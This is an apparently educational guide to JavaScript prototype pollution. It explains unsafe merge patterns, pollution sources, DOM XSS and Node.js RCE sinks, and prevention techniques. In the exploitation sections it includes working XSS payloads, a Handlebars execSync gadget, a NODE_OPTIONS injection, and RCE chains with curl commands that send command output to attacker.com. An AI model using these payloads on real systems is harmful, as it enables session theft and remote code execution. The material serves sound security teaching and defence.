# Prototype Pollution

Prototype pollution is a JavaScript vulnerability where an attacker injects properties into a global object prototype — most commonly `Object.prototype` — causing every object that inherits from that prototype to acquire the injected properties. By itself this is often benign, but when a polluted property flows into a dangerous sink (a DOM element, a `eval()` call, a child process spawner), the result escalates to DOM XSS on the client or remote code execution on the server. The attack is uniquely dangerous because it does not require finding an obvious injection point — it subverts the language's own inheritance model.

**Fundamental principle: In JavaScript, if an object doesn't have a property of its own, the engine walks up the prototype chain to find it. Prototype pollution plants a fake property on `Object.prototype`, so any object that lacks that property "naturally" will silently inherit the attacker's value — and the application code has no way to distinguish this from a legitimately set property.**

***

## JavaScript Prototype Foundations

```javascript
// ── How prototypes work (the inheritance chain) ───────────────────────────────

const obj = { name: "carlos" };

// obj itself:
console.log(obj.name);                         // "carlos"  ← own property

// obj's prototype (Object.prototype):
console.log(obj.__proto__ === Object.prototype); // true
console.log(obj.toString);                       // [Function: toString]
                                                 // ← inherited from Object.prototype

// Property lookup algorithm:
// 1. Does obj have its own "toString" property? No.
// 2. Does obj.__proto__ (Object.prototype) have "toString"? Yes. Return it.
// 3. If not found all the way up → return undefined.

// ── The __proto__ accessor ────────────────────────────────────────────────────
// __proto__ is a GETTER/SETTER on Object.prototype that exposes an object's prototype.
// When you assign: obj.__proto__.newProp = "value"
// → you are modifying the PROTOTYPE (Object.prototype), not obj itself
// → every object that inherits from Object.prototype now has newProp = "value"

Object.prototype.polluted = "YES";
const a = {};
const b = {};
const c = {};
console.log(a.polluted);  // "YES"
console.log(b.polluted);  // "YES"
console.log(c.polluted);  // "YES"    ← ALL objects inherit it ✓

// Own property takes precedence:
const d = { polluted: "my own" };
console.log(d.polluted);  // "my own"  ← own property shadows inherited one
// ← This is why gadgets must NOT be own properties; only inherited ones work as gadgets

// ── Prototype chain for a typical object ─────────────────────────────────────
// myObj → Object.prototype → null
// myArray → Array.prototype → Object.prototype → null
// myFunc → Function.prototype → Object.prototype → null
// All eventually reach Object.prototype → polluting it affects everything ✓

// ── Three ways to read/write a prototype ──────────────────────────────────────
Object.getPrototypeOf(obj);            // recommended read
Object.setPrototypeOf(obj, newProto);  // recommended write
obj.__proto__;                         // legacy getter (still widely supported)
obj.constructor.prototype;             // alternate path to the same prototype
```

***

## How Vulnerabilities Arise: The Unsafe Merge Pattern

The root cause is almost always a recursive merge, deep clone, or `extend` function that iterates over user-supplied key/value pairs and assigns them to a target object — without sanitising keys like `__proto__`, `constructor`, or `prototype`.

```javascript
// ── VULNERABLE: Recursive merge without key sanitisation ─────────────────────

function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);          // ← recurse
        } else {
            target[key] = source[key];                // ← assign
        }
    }
}

// Normal usage (safe input):
const config = {};
merge(config, { theme: "dark", fontSize: 16 });
// config = { theme: "dark", fontSize: 16 }   ✓

// ── ATTACK: Inject __proto__ as the key ───────────────────────────────────────
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);

// What happens step by step:
// for (key in userInput):        key = "__proto__"
// typeof userInput["__proto__"] === 'object':  true → recurse
// merge(target["__proto__"], { isAdmin: true })
//   → target["__proto__"] is Object.prototype (the ACTUAL prototype)
//   → assigns: Object.prototype["isAdmin"] = true        ← POLLUTION ✓

// Effect:
const normalUser = {};
console.log(normalUser.isAdmin);   // true   ← NOT set on normalUser, inherited ✓

// Application checks:
if (req.user.isAdmin) { grantAccess(); }
// normalUser.isAdmin = true (inherited) → access granted ✓


// ── ALTERNATE PATHS: constructor.prototype ─────────────────────────────────
// Some sanitisers block "__proto__" by string comparison but miss these:
const payload = {
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
};
merge({}, payload);
// target["constructor"] → every object's constructor is Object (or its constructor function)
// target["constructor"]["prototype"] → Object.prototype
// → Object.prototype.isAdmin = true  ← same pollution via different path ✓

// Bypass attempts for filters checking only "__proto__":
obj["__proto__"]["x"] = 1           // direct assignment
obj["constructor"]["prototype"]["x"] = 1   // via constructor ✓
obj["__pro"+"to__"]["x"] = 1       // string concatenation bypass (if filter is static)
```

***

## Prototype Pollution Sources

### Source 1: URL Query String / Fragment

```javascript
// ── URL parsing → object property assignment ──────────────────────────────────

// Attacker-crafted URL:
// https://vulnerable-website.com/?__proto__[evilProperty]=payload
// https://vulnerable-website.com/?__proto__[isAdmin]=true

// Vulnerable URL parser code (common in older JS frameworks):
function parseQueryString(qs) {
    const params = {};
    const pairs = qs.split('&');
    for (const pair of pairs) {
        const [rawKey, rawValue] = pair.split('=');
        const key = decodeURIComponent(rawKey);
        const value = decodeURIComponent(rawValue);
        setNestedProperty(params, key, value);  // ← dangerous if key contains __proto__
    }
    return params;
}

function setNestedProperty(obj, path, value) {
    const parts = path.split(/[\.\[\]]+/).filter(Boolean);
    let current = obj;
    for (let i = 0; i < parts.length - 1; i++) {
        if (!current[parts[i]]) current[parts[i]] = {};
        current = current[parts[i]];      // ← if parts[0] = "__proto__", current = Object.prototype ✓
    }
    current[parts[parts.length - 1]] = value;  // ← Object.prototype.evilProperty = "payload" ✓
}

// Input URL: ?__proto__[isAdmin]=true
// parts = ["__proto__", "isAdmin"]
// current = obj → obj["__proto__"] = Object.prototype → current = Object.prototype
// Object.prototype["isAdmin"] = "true"   ← POLLUTION ✓

// ── Fragment (hash) based pollution ──────────────────────────────────────────
// https://vulnerable-website.com/#__proto__[transport_url]=//evil-user.net
// window.location.hash parsed and merged into config:
const hash = window.location.hash.slice(1);  // remove leading #
const params = parseQueryString(hash);
merge(config, params);    // ← pollutes via fragment

// Fragments are NOT sent to the server → bypasses server-side WAF/logging ✓
// Only visible to client-side JavaScript → purely client-side attack ✓
```

### Source 2: JSON Input

```javascript
// ── JSON.parse() quirk: treats "__proto__" as a literal string key ─────────
// JSON.parse is the gateway — the pollution happens when the parsed object
// is subsequently merged into another object.

const safe_literal = {__proto__: {evil: "payload"}};
safe_literal.hasOwnProperty('__proto__');   // false
// ← Object literal: __proto__ is intercepted by JS engine → sets prototype, not own property

const json_parsed = JSON.parse('{"__proto__": {"evil": "payload"}}');
json_parsed.hasOwnProperty('__proto__');    // TRUE ✓
// ← JSON.parse: treats __proto__ as a regular string key → creates OWN property
// → When THIS parsed object is merged into another: merge sees __proto__ as a key
//   → triggers prototype pollution during merge ✓

// ── Attack scenarios via JSON input ──────────────────────────────────────────

// Scenario A: User profile update API
fetch('/api/user/settings', {
    method: 'POST',
    body: JSON.stringify({
        "__proto__": { "isAdmin": true }
    })
});
// Server: const settings = JSON.parse(body); merge(user, settings); → polluted ✓

// Scenario B: WebSocket / postMessage
window.addEventListener('message', (e) => {
    const data = JSON.parse(e.data);  // ← attacker controls e.data
    merge(appState, data);            // ← pollution if data has __proto__ ✓
});
// Attacker's page:
targetWindow.postMessage('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}', '*');

// Scenario C: localStorage / sessionStorage
const saved = JSON.parse(localStorage.getItem('userPrefs'));
merge(currentPrefs, saved);           // ← attacker who can write localStorage can pollute ✓
```

***

## Prototype Pollution Sinks

### Client-Side Sinks → DOM XSS

```javascript
// ── Sink 1: innerHTML / eval / document.write ────────────────────────────────

// Gadget example: library reads config.template, assigns to innerHTML
function renderWidget(config) {
    const template = config.template || defaults.template;  // ← gadget!
    document.getElementById('widget').innerHTML = template; // ← sink: innerHTML
}

// If attacker pollutes: Object.prototype.template = '<img src=x onerror=alert(document.domain)>'
// And config doesn't have its own 'template' property:
// → config.template === Object.prototype.template === '<img src=x onerror=alert(...)>' ✓
// → innerHTML set to XSS payload → DOM XSS fires ✓

// Pollution source: ?__proto__[template]=<img src=x onerror=alert(1)>


// ── Sink 2: Script src / eval from transport_url gadget ──────────────────────

// Vulnerable library code (simplified from real-world analytics/tracking libraries):
let transport_url = config.transport_url || defaults.transport_url;
const script = document.createElement('script');
script.src = `${transport_url}/bundle.js`;   // ← sink: script.src
document.body.appendChild(script);

// Attack URL:
// https://vulnerable-website.com/?__proto__[transport_url]=//attacker.com
// → script.src = "//attacker.com/bundle.js"  → browser loads attacker's JS ✓

// With data: URL (no external server needed):
// https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
// → script.src = "data:,alert(1);///bundle.js"
// → data:,alert(1); executes → // comments out the /bundle.js suffix ✓


// ── Sink 3: setTimeout / setInterval with string argument ────────────────────

// Library code:
setTimeout(config.callback || 'defaultFunction()', 1000);   // ← string eval sink!

// Pollution: Object.prototype.callback = 'alert(document.cookie)'
// → setTimeout('alert(document.cookie)', 1000)  → XSS ✓


// ── Sink 4: Dangerous jQuery patterns ─────────────────────────────────────────

// jQuery's $.extend (vulnerable versions):
$.extend(true, {}, JSON.parse(userInput));    // ← recursive merge → pollution ✓

// jQuery selector with user-controlled option:
// If Object.prototype.selector polluted with <img src=x onerror=...>
// and code does: $(config.selector).show()  → jQuery HTML injection ✓


// ── Finding client-side gadgets using DOM Invader (Burp) ──────────────────────
// DOM Invader automatically:
// 1. Identifies prototype pollution sources (URL, JSON, postMessage)
// 2. Scans for gadgets by monitoring property accesses on polluted prototypes
// 3. Reports gadget→sink chains ✓

// Manual approach in browser console:
Object.prototype.testPollution = 'POLLUTED';
// Then: trigger all application features and watch for errors/behaviours
// If any function reads a property → it's a potential gadget ✓
```

### Server-Side Sinks → RCE

```javascript
// ── Server-side prototype pollution is more severe: can lead to RCE ──────────
// Node.js applications often use the same unsafe merge patterns server-side.

// ── Sink 1: child_process.spawn / exec ────────────────────────────────────────

// Vulnerable server-side code:
const { exec } = require('child_process');
const options = {};
merge(options, req.body);          // ← pollution source: req.body

// Later in the same process:
exec('ls', options, (err, stdout) => res.send(stdout));
// exec options.shell controls the shell used:
// If Object.prototype.shell = "/bin/bash -c 'curl attacker.com/?x=$(id)'"
// → RCE ✓

// Known RCE gadgets in Node.js (child_process family):
//   shell: true                   → enables shell expansion of args (arbitrary commands)
//   env: {"NODE_OPTIONS": "--require /dev/stdin"}   → code injection via env var
//   argv0: "/bin/bash"            → replaces process name

// Attack payload (in req.body JSON):
{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect=0.0.0.0:1337"
    }
}


// ── Sink 2: Server-Side Template Injection via polluted template options ───────

// Handlebars example (CVE-2019-19919):
const Handlebars = require('handlebars');
// If __proto__.outputFunctionName = "_x = process.mainModule.require('child_process')
//                                    .execSync('id').toString(); __tmp2"
// → Handlebars compiles this as code → execSync('id') → RCE ✓

// Pug template engine:
// If __proto__.block polluted → RCE via template AST manipulation ✓


// ── Sink 3: Status code / header injection ────────────────────────────────────

// Express.js: if Object.prototype.status is polluted:
res.send(body);     // Express internally reads options.status
// → HTTP response status manipulated → error page exposure → info disclosure ✓

// res.json() reads options → polluted options → response body manipulation ✓


// ── Detecting server-side PP without visible error output ─────────────────────

// Blind detection via status code changes:
// Pollute a property that affects server behaviour without crashing:

// JSON body 1 (baseline):
POST /api/data HTTP/1.1
{"key": "value"}
// Response: 200 OK

// JSON body 2 (polluted — change status to 555):
POST /api/data HTTP/1.1
{"__proto__": {"status": 555}}
// Response: 555 ??? ← non-standard status → confirms server-side pollution ✓
// (Express uses options.status if set)

// Pollute JSON spaces for detection:
{"__proto__": {"json spaces": 10}}
// If response JSON is now indented with 10 spaces → pollution confirmed ✓
// (Express's res.json() uses app.settings['json spaces'] which inherits from prototype)

// SSPP (Server-Side Prototype Pollution) scanner (Burp extension):
// Automatically tests for these blind detection techniques ✓
```

***

## Exploitation Chain: Source → Gadget → Sink

```
─────────────────────────────────────────────────────────────────────────────
Full exploitation chain example (client-side → DOM XSS):
─────────────────────────────────────────────────────────────────────────────

  TARGET: https://vulnerable-website.com
  LIBRARY: analytics.js (uses config.transport_url for script loading)
  SOURCE:  URL query string parsed by app's router
  GADGET:  config.transport_url (not set by developer → inheritable from prototype)
  SINK:    script.src = `${transport_url}/track.js`

STEP 1: Confirm the source (can we pollute via URL?):
  https://vulnerable-website.com/?__proto__[test]=polluted
  Open browser console:
  > ({}).test         → "polluted"  ✓  (Object.prototype.test = "polluted")
  > Object.prototype.test  → "polluted" ✓

STEP 2: Find a gadget (what properties does the app read that it doesn't own?):
  // Method A: DOM Invader → enable prototype pollution scanning → browse the app
  // Method B: Manual — before pollution, in console:
  Object.prototype.transport_url = 'GADGET_TEST';
  // → if a script tag appears pointing to GADGET_TEST/track.js → gadget confirmed ✓

STEP 3: Confirm gadget → sink chain:
  https://vulnerable-website.com/?__proto__[transport_url]=//attacker.com
  → Inspect DOM: <script src="//attacker.com/track.js"> ← injected ✓

STEP 4: Craft final exploit URL:
  https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(document.domain);//

STEP 5: Deliver to victim (social engineering / reflected link):
  → Victim visits URL → script executes → XSS fires ✓ → cookies/session stolen ✓

─────────────────────────────────────────────────────────────────────────────
Full exploitation chain (server-side → RCE):
─────────────────────────────────────────────────────────────────────────────

  TARGET:  Node.js REST API
  SOURCE:  POST /api/settings (body parsed by vulnerable deep-merge function)
  GADGET:  spawn/exec options.shell (not set by code → inheritable from prototype)
  SINK:    child_process.exec(userCommand, options, callback)

STEP 1: Confirm server-side pollution (blind — use json spaces technique):
  POST /api/settings
  {"__proto__": {"json spaces": 10}}
  → Response JSON indented 10 spaces ✓ → SSPP confirmed

STEP 2: Identify RCE gadget:
  POST /api/settings
  {"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /dev/stdin"}}}
  → Test if subsequent commands behave differently / cause errors ✓

STEP 3: Exfiltration payload:
  POST /api/settings HTTP/1.1
  Content-Type: application/json

  {
      "__proto__": {
          "shell": "/bin/bash",
          "env": {
              "CMD": "id > /tmp/pwned && curl https://attacker.com/?x=$(cat /tmp/pwned)"
          }
      }
  }
  → Any subsequent exec() call inherits shell + env → RCE ✓
```

***

## Prevention

```javascript
// ── FIX 1: Sanitise keys in merge/clone functions ─────────────────────────────

function safeMerge(target, source) {
    for (const key of Object.keys(source)) {
        // Block ALL prototype pollution vectors:
        if (key === '__proto__') continue;           // direct __proto__
        if (key === 'constructor') continue;         // constructor.prototype path
        if (key === 'prototype') continue;           // direct prototype

        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
// Note: use Object.keys() (own enumerable only), NOT for...in (includes inherited)


// ── FIX 2: Create objects with null prototype ──────────────────────────────────

// Objects with null prototype have NO prototype chain → cannot inherit pollution
const safeConfig = Object.create(null);
// safeConfig.__proto__ === undefined
// → Even if Object.prototype is polluted, safeConfig is immune ✓

// Useful for dictionaries / maps where you don't need prototype methods:
const lookup = Object.create(null);
lookup['key'] = 'value';   // safe dictionary ✓
// → "key" in lookup: fine. But: lookup.toString() → TypeError (no prototype) ⚠
// → Use only where prototype methods are not needed


// ── FIX 3: Object.freeze() the prototype ──────────────────────────────────────

Object.freeze(Object.prototype);
// → Any attempt to add properties to Object.prototype is silently ignored (or throws in strict mode)
// → Object.prototype.__proto__ = null; → has no effect ✓
// → Highly effective but: may break libraries that legitimately add to Object.prototype
// → Best for production applications after thorough testing

Object.freeze(Object.prototype);
({}).polluted = "test";        // silently ignored ✓
console.log(({}).polluted);    // undefined ✓


// ── FIX 4: Use Map instead of plain objects for user data ─────────────────────

// Plain object: vulnerable to prototype pollution
const config = {};
config[userKey] = userValue;    // if userKey = "__proto__" → pollution ✓

// Map: no prototype chain interference
const safeMap = new Map();
safeMap.set(userKey, userValue);  // __proto__ stored as literal string key ✓
safeMap.get("__proto__");         // returns the value, doesn't touch prototype ✓


// ── FIX 5: Schema validation before merging user input ────────────────────────

// Using JSON Schema (ajv):
const Ajv = require('ajv');
const ajv = new Ajv();
const schema = {
    type: 'object',
    properties: {
        theme:    { type: 'string', enum: ['light', 'dark'] },
        fontSize: { type: 'number', minimum: 8, maximum: 48 }
    },
    additionalProperties: false    // ← rejects __proto__, constructor, any unknown key ✓
};
const validate = ajv.compile(schema);
if (!validate(userInput)) throw new Error('Invalid input');
merge(config, userInput);  // safe: only whitelisted properties pass schema ✓


// ── FIX 6: Use structured clone or JSON serialisation roundtrip ───────────────

// structuredClone() (modern browsers/Node.js 17+):
const safeClone = structuredClone(userInput);
// → Does NOT copy __proto__ properties ✓
// → Serializes to structured data → prototype links stripped ✓

// JSON roundtrip (less preferred but widely available):
const sanitised = JSON.parse(JSON.stringify(userInput));
// → JSON.stringify: __proto__ is serialised as a literal key
// → JSON.parse: creates object with __proto__ as own property
// → BUT: still vulnerable to merge if you subsequently deep-merge this ⚠
// → Use JSON roundtrip ONLY if you reassign top-level properties, not deep merge
```
